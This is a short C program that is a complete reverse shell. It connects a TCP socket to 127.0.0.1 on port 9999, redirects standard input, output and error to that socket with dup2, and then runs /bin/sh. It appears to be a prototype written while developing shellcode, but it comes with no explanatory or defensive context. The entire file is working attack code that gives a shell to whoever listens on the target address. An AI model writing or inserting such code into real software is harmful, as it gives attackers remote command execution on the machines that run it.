#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{

	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in host_addr;

	host_addr.sin_family = AF_INET;
	
	host_addr.sin_port = htons(9999);

	host_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	
	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
		
	int i;
	for(i=0; i<=2; i++) 
		dup2(host_sock, i);
	
	execve("/bin/sh", NULL, NULL);

}
